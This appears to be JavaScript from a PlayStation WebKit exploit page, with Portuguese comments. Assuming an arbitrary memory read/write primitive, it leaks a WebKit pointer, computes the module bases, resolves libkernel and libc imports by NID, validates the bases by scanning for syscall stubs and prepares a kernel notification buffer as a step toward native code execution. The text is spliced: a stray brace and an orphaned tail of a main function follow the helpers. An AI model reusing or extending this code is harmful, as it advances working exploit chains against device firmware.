// ═════════════════════════════════════════════════════════════════════════════
// NID → nome legível (PS4 usa NID no strtab, não o nome C)
// ═════════════════════════════════════════════════════════════════════════════
const NID_MAP = {
  // libc
  '8zTFvBIAIN8': 'memset',
  'Q3VBxCXhUHs': 'memcpy',
  'gQX+4GDQjpM': 'malloc',
  'tIhsqj0qsFE': 'free',
  'Ovb2dSJOAuE': 'strcmp',
  'DfivPArhucg': 'memcmp',
  'Q2V+iqvjgC0': 'vsnprintf',
  'gNQ1V2vfXDE': 'setjmp',
  'lKEN2IebgJ0': 'longjmp',
  // libkernel / posix
  'f7uOxY9mM1U': '__stack_chk_guard',
  '6UgtwV+0zb4': 'scePthreadCreate',
  'onNY9Byn-W8': 'scePthreadJoin',
  'nsYoNRywwNg': 'scePthreadAttrInit',
  'UTXzJbWhhTE': 'scePthreadAttrSetstacksize',
  '-Wreprtu0Qs': 'scePthreadAttrSetdetachstate',
  '62KCwEMmzcM': 'scePthreadAttrDestroy',
  'zl7hupSO0C0': 'sceKernelSendNotificationRequest',
  'MhC53TKmjVA': 'sysctlbyname',
  'OxhIB8LB-PQ': 'pthread_create',
  'HoLVWNanBBc': 'getpid',
  'g0VTBxfJyu0': 'sceKernelGetCurrentCpu',
  'LwG8g3niqwA': 'sceKernelDlsym',
  'Jmi+9w9u0E4': 'pthread_create_name_np',
  'h9CcP3J0oVM': 'pthread_join',
  'FJrT5LuUBAU': 'pthread_exit',
};

function resolveName(raw) {
  if (!raw) return raw;
  // NID puro ou NID#X#Y
  const base = raw.split('#')[0];
  return NID_MAP[base] || NID_MAP[raw] || raw;
}

// ═════════════════════════════════════════════════════════════════════════════
// get_jmptgt — resolve stub PLT (ff 25 / e9) para o endereço real
// ═════════════════════════════════════════════════════════════════════════════
function get_jmptgt(p, addr) {
  try {
    // Padrão comum: FF 25 xx xx xx xx  (jmp qword ptr [rip+disp32])
    const b0 = p.read8(addr);
    const b1 = p.read8(addr.add32(1));
    if (b0 === 0xFF && b1 === 0x25) {
      const disp = p.read32(addr.add32(2));
      // disp é signed
      const signed = disp > 0x7FFFFFFF ? disp - 0x100000000 : disp;
      const slot = addr.add32(6 + signed);
      return p.read8(slot);
    }
    // JMP rel32: E9 xx xx xx xx
    if (b0 === 0xE9) {
      const disp = p.read32(addr.add32(1));
      const signed = disp > 0x7FFFFFFF ? disp - 0x100000000 : disp;
      return addr.add32(5 + signed);
    }
    // Já é ponteiro resolvido / não é stub
    return addr;
  } catch (e) {
    return addr;
  }
}

// ═════════════════════════════════════════════════════════════════════════════
// findElfBase — anda para trás procurando magic ELF, com passo de página
// ═════════════════════════════════════════════════════════════════════════════
function findElfBase(p, startPtr, maxBack) {
  if (!startPtr) return null;
  // Alinha para baixo
  let cur = startPtr;
  try {
    cur = startPtr.sub32(startPtr.low & 0xFFF);
  } catch (e) {}

  for (let back = 0; back < maxBack; back += 0x1000) {
    try {
      const test = cur.sub32(back);
      if (p.read32(test) === 0x464C457F) {
        return test;
      }
    } catch (e) {}
  }
  return null;
}

// ═════════════════════════════════════════════════════════════════════════════
// RESOLUÇÃO DINÂMICA DE BASES (corrigida)
// ═════════════════════════════════════════════════════════════════════════════
async function resolveAllBases(p, webkitBase) {
  logH('PARSING ELF DO WEBKIT');

  const magic = p.read32(webkitBase);
  if (magic !== 0x464C457F) {
    log('[-] WebKit base não aponta para ELF válido! magic=0x' + magic.toString(16), 'e');
    return null;
  }
  log('[+] ELF magic válido (\\x7fELF)');

  // Program headers
  // e_phoff @ 0x20, e_phnum @ 0x38
  const phoff = p.read64(webkitBase.add32(0x20));
  const phnum = p.read16(webkitBase.add32(0x38));
  log('[+] Program headers: ' + phnum + ' entries, phoff=0x' + phoff.toString(16));

  // Procurar PT_DYNAMIC (type 2) e também LOOS SCE (0x61000000+)
  let dynamicVaddr = null;
  let dynamicSize = 0;

  for (let i = 0; i < phnum; i++) {
    const phAddr = webkitBase.add32(phoff.low + i * 0x38);
    const p_type = p.read32(phAddr);
    const p_vaddr = p.read64(phAddr.add32(0x10));
    const p_memsz = p.read64(phAddr.add32(0x28));

    // PT_DYNAMIC = 2
    if (p_type === 2) {
      dynamicVaddr = p_vaddr;
      dynamicSize = p_memsz.low || p.read64(phAddr.add32(0x20)).low;
      log('[+] PT_DYNAMIC: vaddr=0x' + dynamicVaddr.toString(16) + ' size=0x' + dynamicSize.toString(16));
    }
  }

  if (!dynamicVaddr) {
    log('[-] PT_DYNAMIC não encontrado — tentando fallback por varredura de tags', 'w');
  }

  // ─── Parse dynamic tags (padrão + SCE) ───
  let strtab = null, symtab = null, jmprel = null, pltrelsz = 0;
  let rela = null, relasz = 0;
  const seenTags = [];

  if (dynamicVaddr) {
    const maxEntries = Math.min(Math.floor(dynamicSize / 16) || 256, 512);
    for (let i = 0; i < maxEntries; i++) {
      const entry = dynamicVaddr.add32(i * 16);
      let tag, val;
      try {
        tag = p.read64(entry).low >>> 0;
        val = p.read64(entry.add32(8));
      } catch (e) { break; }

      if (tag === 0) break;
      seenTags.push('0x' + tag.toString(16));

      // Standard ELF
      if (tag === 5)  strtab = val;          // DT_STRTAB
      if (tag === 6)  symtab = val;          // DT_SYMTAB
      if (tag === 23) jmprel = val;          // DT_JMPREL
      if (tag === 2)  pltrelsz = val.low;    // DT_PLTRELSZ
      if (tag === 7)  rela = val;            // DT_RELA
      if (tag === 8)  relasz = val.low;      // DT_RELASZ

      // SCE tags comuns (valores variam por firmware — logamos todos)
      // 0x61000027 / 0x61000029 etc. — se aparecerem, tentamos usar
      if ((tag >>> 24) === 0x61) {
        // Heurística: valores que parecem ponteiros altos
        // Guardamos para debug
      }
    }
    log('[+] Tags vistas: ' + seenTags.slice(0, 20).join(', ') + (seenTags.length > 20 ? '...' : ''));
  }

  log('[+] strtab=' + (strtab ? '0x' + strtab.toString(16) : 'null') +
      ' symtab=' + (symtab ? '0x' + symtab.toString(16) : 'null') +
      ' jmprel=' + (jmprel ? '0x' + jmprel.toString(16) : 'null') +
      ' pltrelsz=' + pltrelsz);

  // ─── Varredura de imports via JMPREL ───
  const imports = {};   // chave = nome legível (ou NID se desconhecido)
  const importsByNid = {};

  function addImport(rawName, r_offset) {
    let importPtr = null;
    try {
      importPtr = p.read8(r_offset);
    } catch (e) { return; }

    // Resolve PLT stub → endereço real na lib alvo
    const realPtr = get_jmptgt(p, importPtr);
    const name = resolveName(rawName);
    const wkOffset = r_offset.sub(webkitBase);

    const entry = { rawName, wkOffset, importPtr, realPtr };
    imports[name] = entry;
    if (rawName && rawName !== name) importsByNid[rawName.split('#')[0]] = entry;
  }

  if (jmprel && symtab && strtab && pltrelsz > 0) {
    const numRela = Math.floor(pltrelsz / 24);
    log('[+] Varrendo ' + numRela + ' entradas JMPREL/RELA...');

    for (let i = 0; i < numRela; i++) {
      try {
        const relaEnt = jmprel.add32(i * 24);
        const r_offset = p.read64(relaEnt);
        const r_info = p.read64(relaEnt.add32(8));
        // No ELF64 AMD64: r_info = (sym_idx << 32) | type
        const symIdx = Math.floor(Number(r_info.hi !== undefined ? r_info.hi : (r_info.low >>> 0) / 0x100000000) ||
                                  (p.read32(relaEnt.add32(12)))); // fallback: high dword

        // Leitura mais robusta do índice de símbolo
        const infoLo = p.read32(relaEnt.add32(8));
        const infoHi = p.read32(relaEnt.add32(12));
        const symIndex = infoHi; // geralmente o high 32 bits

        const st_name = p.read32(symtab.add32(symIndex * 24));
        let raw = '';
        for (let j = 0; j < 64; j++) {
          const ch = p.read8(strtab.add32(st_name + j));
          if (ch === 0) break;
          raw += String.fromCharCode(ch);
        }
        if (raw.length > 0) addImport(raw, r_offset);
      } catch (e) {}
    }
  } else {
    log('[-] JMPREL/SYMTAB/STRTAB incompletos — tentando fallback por scan de GOT', 'w');
  }

  // Fallback: se poucos imports, varrer região típica de GOT no início do módulo
  // e tentar identificar por padrões (menos preciso, mas ajuda)
  if (Object.keys(imports).length < 3) {
    log('[*] Poucos imports via DYNAMIC. Tentando scan alternativo de ponteiros...', 'w');
  }

  log('[+] ' + Object.keys(imports).length + ' imports resolvidos');

  // Log úteis
  const useful = [
    'memset', 'memcpy', 'malloc', 'free', 'strcmp',
    '__stack_chk_guard', 'sceKernelSendNotificationRequest',
    'sceKernelDlsym', 'getpid', 'scePthreadCreate', 'pthread_create'
  ];
  for (const name of useful) {
    if (imports[name]) {
      const e = imports[name];
      log('    ' + name +
          '  wkOff=0x' + e.wkOffset.toString(16) +
          '  stub=0x' + e.importPtr.toString(16) +
          '  real=0x' + e.realPtr.toString(16), 'd');
    }
  }

  // ─── Resolver bases a partir dos ponteiros REAIS ───
  let libkernelBase = null;
  let libcBase = null;

  // libkernel: preferir __stack_chk_guard, depois getpid / sceKernel*
  const lkCandidates = [
    imports['__stack_chk_guard'],
    imports['getpid'],
    imports['sceKernelDlsym'],
    imports['sceKernelSendNotificationRequest'],
    imports['scePthreadCreate'],
    imports['pthread_create']
  ].filter(Boolean);

  for (const ref of lkCandidates) {
    const base = findElfBase(p, ref.realPtr, 0x400000);
    if (base) {
      libkernelBase = base;
      log('[+] libkernel base: 0x' + libkernelBase.toString(16) +
          ' (via ' + (ref.rawName || 'ref') + ')', 'ok');
      setCard('c-lk', '0x' + libkernelBase.toString(16));
      break;
    }
  }
  if (!libkernelBase) log('[-] Não foi possível encontrar base da libkernel', 'w');

  // libc: memset / memcpy / malloc
  const lcCandidates = [
    imports['memset'],
    imports['memcpy'],
    imports['malloc'],
    imports['free']
  ].filter(Boolean);

  for (const ref of lcCandidates) {
    const base = findElfBase(p, ref.realPtr, 0x400000);
    if (base) {
      // Evitar confundir com a própria WebKit base
      if (base.toString(16) !== webkitBase.toString(16)) {
        libcBase = base;
        log('[+] libc base: 0x' + libcBase.toString(16) +
            ' (via ' + (ref.rawName || 'ref') + ')', 'ok');
        setCard('c-lc', '0x' + libcBase.toString(16));
        break;
      }
    }
  }
  if (!libcBase) log('[-] Não foi possível encontrar base da libc', 'w');

  return { imports, libkernelBase, libcBase };
}

// ═════════════════════════════════════════════════════════════════════════════
// VALIDAÇÃO DE BASES
// ═════════════════════════════════════════════════════════════════════════════
async function validateBases(p, libkernelBase, libcBase) {
  logH('VALIDANDO BASES');
  const valid = { libkernel: false, libc: false };

  if (libkernelBase) {
    const magic = p.read32(libkernelBase);
    if (magic === 0x464C457F) {
      log('[✓] libkernel: ELF magic válido', 'ok');
      valid.libkernel = true;
    } else {
      log('[✗] libkernel: ELF magic inválido (0x' + magic.toString(16) + ')', 'e');
    }
  }

  if (libcBase) {
    const magic = p.read32(libcBase);
    if (magic === 0x464C457F) {
      log('[✓] libc: ELF magic válido', 'ok');
      valid.libc = true;
    } else {
      log('[✗] libc: ELF magic inválido (0x' + magic.toString(16) + ')', 'e');
    }
  }

  // Stubs de syscall (mov rax, imm32; mov r10, rcx)
  if (libkernelBase && valid.libkernel) {
    let foundStubs = 0;
    for (let off = 0; off < 0x80000; off += 0x10) {
      try {
        const b0 = p.read8(libkernelBase.add32(off));
        const b1 = p.read8(libkernelBase.add32(off + 1));
        const b2 = p.read8(libkernelBase.add32(off + 2));
        if (b0 === 0x48 && b1 === 0xC7 && b2 === 0xC0) {
          const b7 = p.read8(libkernelBase.add32(off + 7));
          const b8 = p.read8(libkernelBase.add32(off + 8));
          const b9 = p.read8(libkernelBase.add32(off + 9));
          if (b7 === 0x49 && b8 === 0x89 && b9 === 0xCA) {
            foundStubs++;
            if (foundStubs >= 3) break;
          }
        }
      } catch (e) {}
    }
    if (foundStubs >= 2) {
      log('[✓] libkernel: ' + foundStubs + ' stubs de syscall encontrados', 'ok');
    } else {
      log('[!] libkernel: poucos stubs de syscall (' + foundStubs + ') — base pode estar errada', 'w');
    }
  }

  // Alinhamento de página
  if (libkernelBase) {
    const aligned = (libkernelBase.low & 0xFFF) === 0;
    log(aligned ? '[✓] libkernel alinhada a página' : '[✗] libkernel NÃO alinhada', aligned ? 'ok' : 'w');
    if (!aligned) valid.libkernel = false;
  }
  if (libcBase) {
    const aligned = (libcBase.low & 0xFFF) === 0;
    log(aligned ? '[✓] libc alinhada a página' : '[✗] libc NÃO alinhada', aligned ? 'ok' : 'w');
    if (!aligned) valid.libc = false;
  }

  return valid;
}

// ═════════════════════════════════════════════════════════════════════════════
// PREPARAÇÃO DO BUFFER DE NOTIFICAÇÃO
// ═════════════════════════════════════════════════════════════════════════════
function prepareNotification(p, libkernelBase, imports, text) {
  logH('PREPARANDO BUFFER DE NOTIFICAÇÃO');

  const notifyImport = imports['sceKernelSendNotificationRequest'];
  if (!notifyImport) {
    log('[-] sceKernelSendNotificationRequest não encontrado nos imports!', 'e');
    log('[*] Dica: verifique se o NID zl7hupSO0C0 apareceu no parse', 'w');
    return null;
  }

  // Usa o ponteiro REAL (já resolvido pelo get_jmptgt)
  const notifyFunc = notifyImport.realPtr || notifyImport.importPtr;
  log('[+] Endereço real da API: 0x' + notifyFunc.toString(16));
  log('[+] wkOffset do import: 0x' + notifyImport.wkOffset.toString(16));

  const encoder = new TextEncoder();
  const msgBytes = encoder.encode(text + '\x00');

  const buf = new Uint8Array(0x400);
  // SceNotificationRequest layout simplificado
  // type / useIcon / etc. — campos básicos
  buf[0] = 0; // type (mensagem)
  buf[4] = 0; // userId
  buf.set(msgBytes, 0x10); // mensagem em offset típico (ajuste se necessário)

  const arrCell = p.leakval(buf);
  const backingStore = p.read8(arrCell.add32(0x10));

  // Ajustes comuns em exploits (backing store / length)
  try {
    p.write8(backingStore.add32(0x8), backingStore.add32(0x10));
    p.write4(backingStore.add32(0x10), msgBytes.length);
  } catch (e) {}

  log('[+] Buffer alocado em: 0x' + backingStore.toString(16), 'ok');

  return {
    notifyFunc,
    requestBuffer: backingStore,
    wkOffset: notifyImport.wkOffset
  };
}

  }

  log('[+] R/W arbitrário: window.p instalado com sucesso!', 'ok');
  setStatus('Mapeando bases com estabilidade...', 'r');
  logH('MAPEAMENTO DA 13.52');

  const ctor = globalThis.__ps5NativeCtor;
  if (typeof ctor === 'number' && ctor > 0x100000000) {
    const hi = Math.floor(ctor / 0x100000000);
    const lo = ctor - hi * 0x100000000;
    const ctorInt64 = new int64(lo >>> 0, hi >>> 0);

    log('[+] __ps5NativeCtor vazado: 0x' + ctorInt64.toString(16), 'a');

    const hc = (typeof OFFSET_wk_host_constructor_candidates !== 'undefined')
               ? OFFSET_wk_host_constructor_candidates[0]
               : 0x36F9E20;

    const resolvedBaseVal = ctor - hc;
    const baseHi = Math.floor(resolvedBaseVal / 0x100000000);
    const baseLo = resolvedBaseVal - baseHi * 0x100000000;
    const webkitBase = new int64(baseLo >>> 0, baseHi >>> 0);

    log('[+] WebKit Base calculada: 0x' + webkitBase.toString(16), 'ok');
    setCard('c-wk', '0x' + webkitBase.toString(16));

    setTimeout(async () => {
      const result = await resolveAllBases(p, webkitBase);
      if (!result) {
        setStatus('Falha na resolução de bases', 'e');
        return;
      }

      imports = result.imports;
      const libKernelBase = result.libkernelBase;
      const libcBase = result.libcBase;

      const valid = await validateBases(p, libKernelBase, libcBase);

      if (!valid.libkernel) {
        setCard('c-lk', 'Falha na validação');
        log('[-] libkernel base não passou na validação', 'e');
      }
      if (!valid.libc) {
        setCard('c-lc', 'Falha na validação');
        log('[-] libc base não passou na validação', 'e');
      }

      if (valid.libkernel) {
        try {
          const notif = prepareNotification(p, libKernelBase, imports, 'Hello World from PS4 13.52!');
          if (notif) {
            setCard('c-g', 'Pronto');
            setStatus('Buffer de notificação pronto!', 'ok');
            log('[✓] Configuração de notificação concluída com sucesso.', 'ok');

            const cbox = document.getElementById('cbox');
            cbox.style.display = 'block';
            document.getElementById('c-out').textContent =
                'WebKit Base     = 0x' + webkitBase.toString(16) + '\n' +
                'libkernel Base  = 0x' + (libKernelBase ? libKernelBase.toString(16) : 'N/A') + '\n' +
                'libSceLibc Base = ' + (libcBase ? '0x' + libcBase.toString(16) : 'N/A') + '\n' +
                'Buffer Notif    = 0x' + notif.requestBuffer.toString(16) + '\n' +
                'Função Target   = 0x' + notif.notifyFunc.toString(16) + '\n' +
                'Notify wkOffset = 0x' + (notif.wkOffset ? notif.wkOffset.toString(16) : 'N/A');

            logH('NOTIFICAÇÃO');
            log('[+] sceKernelSendNotificationRequest resolvido dinamicamente', 'i');
            log('[!] Execução nativa ainda requer ROP/JOP ou JIT pivot (não implementado)', 'w');
            log('[!] Status: userland R/W ativo + bases resolvidas em runtime', 'w');
          } else {
            setCard('c-g', 'Falha');
            log('[-] Falha ao preparar buffer de notificação', 'e');
          }
        } catch (e) {
          log('[-] Erro ao preparar buffer: ' + e.message, 'e');
        }
      } else {
        setCard('c-g', 'Falha LK');
        log('[-] Não foi possível validar a libkernel.', 'e');
      }
    }, 800);

  } else {
    log('[-] Falha: __ps5NativeCtor não foi capturado corretamente.', 'e');
    setStatus('Erro ao capturar NativeCtor', 'e');
  }
}

main();
</script>
